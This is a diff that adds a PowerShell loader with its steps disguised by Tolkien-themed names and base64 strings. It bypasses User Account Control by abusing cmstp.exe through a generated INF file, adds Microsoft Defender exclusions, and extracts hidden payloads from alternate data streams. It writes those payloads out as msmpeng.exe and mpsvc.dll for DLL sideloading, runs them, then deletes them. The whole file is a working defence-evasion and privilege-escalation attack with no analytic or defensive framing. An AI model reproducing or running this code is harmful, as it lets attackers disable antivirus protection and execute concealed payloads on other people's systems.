@@ -1,0 +1,167 @@
+$currentFilename = '\defenderscan.js'
+$currentDirectory = 'C:\Users\a\Desktop\test'
+
+$middleEarthMemberDefinition = @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+'@
+
+Function Set-ScrollOfEru {
+    [CmdletBinding()]
+    Param (
+        [Parameter(HelpMessage="Specify the Scroll of Eru location")]
+        $ScrollLocation = "$env:temp\ScrollOfEru.inf"
+    )
+
+    $ScrollContent = @"
+[version]
+Signature=`$chicago`$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+wscript.exe `"$currentDirectory`"`"$currentFilename`"
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+ServiceName="CorpVPN"
+ShortSvcName="CorpVPN"
+"@
+    $ScrollContent | Out-File $ScrollLocation -Encoding ASCII
+}
+
+Function Get-Palantir {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
+    )
+    Process {
+        $ErrorActionPreference = 'Stop'
+        Try {
+            $palantir = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
+        } Catch {
+            $palantir = $null
+        }
+        $hash = @{
+            ProcessName = $ProcessName
+            Palantir    = $palantir
+        }
+        New-Object -TypeName PsObject -Property $hash
+    }
+}
+
+function Set-WindowOnMiddleEarth {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
+    )
+    Process {
+        Add-Type -MemberDefinition $middleEarthMemberDefinition -Name Api -Namespace User32
+        $palantir = Get-Palantir -ProcessName $Name | Select-Object -ExpandProperty Palantir
+        If ($palantir) {
+            $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
+            [User32.Api]::SetForegroundWindow($palantir)
+            [User32.Api]::ShowWindow($palantir, 5)
+        } Else {
+            [string] $palantir = 'N/A'
+        }
+        $hash = @{
+            Process = $Name
+            Palantir = $palantir
+        }
+        New-Object -TypeName PsObject -Property $hash
+    }
+}
+
+Function Bypass-GondorGate {
+    [CmdletBinding()]
+    Param ()
+
+    $ScrollLocation = "$env:temp\ScrollOfEru.inf"
+    Set-ScrollOfEru -ScrollLocation $ScrollLocation
+
+    Add-Type -AssemblyName System.Windows.Forms
+
+    If (Test-Path $ScrollLocation) {
+        $ps = New-Object System.Diagnostics.ProcessStartInfo "c:\windows\system32\cmstp.exe"
+        $ps.Arguments = "/au $ScrollLocation"
+        $ps.UseShellExecute = $false
+
+        [System.Diagnostics.Process]::Start($ps)
+
+        do {
+        } until ((Set-WindowOnMiddleEarth cmstp).Palantir -ne 0)
+
+        Set-WindowOnMiddleEarth cmstp
+
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+    }
+}
+
+function Test-HobbitInCouncil {
+     try {
+        # Get the current user's group memberships using whoami /groups
+        $whoamiGroups = whoami /groups
+
+        # Check if the user is in the local Administrators group by looking for the well-known SID for the Administrators group (S-1-5-32-544)
+        $isInLocalAdmins = $whoamiGroups -match "S-1-5-32-544"
+
+        # Check if the user is in the Domain Admins group by looking for the Domain Admins SID (S-1-5-21domain-512)
+        # Replace 'Domain Admins' with the actual group name if needed
+        $isInDomainAdmins = $whoamiGroups -match "Domain Admins"
+
+        # Return true if the user is in either group
+        return $isInLocalAdmins -or $isInDomainAdmins
+    }
+    catch {
+        Write-Error $_.Exception.Message
+        return $false
+    }
+}
+
+function Test-MordorElevation {
+    try {
+        $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        return $isElevated
+    }
+    catch {
+        return $false
+    }
+}
+
+$frodo = "bXNtcGVuZy5leGU="  #msmpeng.exe
+$samwise = "bXBzdmMuZGxs"    #mpsvc.dll
+$aragorn = "ZGVmZW5kZXJzY2FuLmpzOmxvbGJpbg==" #defenderscan.js:lolbin
+$legolas = "ZGVmZW5kZXJzY2FuLmpzOnBheWxvYWQ=" #defenderscan.js:payload
+
+if (Test-HobbitInCouncil)
+{
+    if(-Not (Test-MordorElevation))
+    {
+        Bypass-GondorGate
+    }
+    else {
+        $gandalf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($frodo))
+        Add-MpPreference -ExclusionProcess $gandalf
+		Add-MpPreference -ExclusionPath (Get-Item .).FullName
+        $boromir = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aragorn))
+        $gandalfContent = Get-Content $currentDirectory\$boromir -Encoding Byte -ReadCount 0
+        Set-Content $currentDirectory\$gandalf -Encoding Byte -Value $gandalfContent
+        $gimli = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($legolas))
+        $aragorn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($samwise))
+        $aragornContent = Get-Content $currentDirectory\$gimli -Encoding Byte -ReadCount 0
+        Set-Content $currentDirectory\$aragorn -Encoding Byte -Value $aragornContent
+        $proc = Start-Process $currentDirectory\$gandalf -Wait
+        Remove-Item $currentDirectory\$gandalf
+        Remove-Item $currentDirectory\$aragorn
+    }
+}
